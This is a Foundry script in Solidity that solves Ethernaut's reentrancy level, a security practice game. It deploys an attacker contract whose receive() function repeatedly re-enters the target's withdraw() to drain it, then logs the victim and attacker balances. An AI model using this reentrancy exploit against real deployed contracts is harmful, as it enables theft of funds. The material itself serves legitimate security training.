// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Reentrance} from "../../src/level-10/EthernautReentrancy.sol";

contract ReentranceAttack {
    Reentrance reentrance =
        Reentrance(payable(0x9A8e5c652e94853B30F82AE4cd27D9BB735F6176));

    constructor() public payable {
        reentrance.donate{value: 0.0001 ether}(address(this));
    }

    function attack() public payable {
        reentrance.withdraw(0.0001 ether);
        (bool result, ) = msg.sender.call{value: 0.0002 ether}("");
        require(result);
    }

    function withdraw() external payable {
        selfdestruct(msg.sender);
    }

    receive() external payable {
        if (address(reentrance).balance >= 0) {
            reentrance.withdraw(reentrance.balanceOf(address(this)));
        }
    }
}

contract ReentranceSolution is Script {
    ReentranceAttack reentranceAttack;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        reentranceAttack = new ReentranceAttack{value: 0.0001 ether}();
        reentranceAttack.attack();
        reentranceAttack.withdraw();
        vm.stopBroadcast();
        console.log(
            "Victim contract balance",
            address(0x9A8e5c652e94853B30F82AE4cd27D9BB735F6176).balance
        );
        console.log(
            "Attacker contract balance",
            address(reentranceAttack).balance
        );
        console.log(
            "My wallet balance",
            address(vm.envUint("MY_ADDRESS")).balance
        );
    }
}
